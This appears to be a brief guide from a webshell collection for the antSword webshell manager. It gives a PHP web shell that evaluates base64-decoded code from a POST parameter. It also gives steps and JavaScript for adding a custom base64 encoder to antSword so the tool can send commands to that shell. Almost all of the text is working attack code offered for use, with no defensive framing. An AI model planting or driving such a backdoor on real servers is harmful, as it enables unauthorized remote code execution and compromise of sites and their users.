shell code
```php
<?php 
$a = $_POST['n985de9'];
if(isset($a)) {
    eval(base64_decode($a));
}
?>
```

add : source/core/php/encoder/mybase64.js
![](https://raw.githubusercontent.com/tennc/webshell/master/antSword/2016051523140225737.png)

```js
module.exports = (pwd, data) => {
  data[pwd] = new Buffer(data['_']).toString('base64');
  delete data['_'];
  return data;
}
```

edit : sources/core/php/index.js < add some code: regedit mybase64.js
![](https://raw.githubusercontent.com/tennc/webshell/master/antSword/2016051523132374985.png)

```js
  get encoders() {
    return ['chr', 'base64', 'mybase64'];
  }
```
restart antsword, and add shell, select mybase64 encode  for this shell code.
![](https://raw.githubusercontent.com/tennc/webshell/master/antSword/2016051523122747980.png)

![](https://raw.githubusercontent.com/tennc/webshell/master/antSword/2016051523124431883.png)
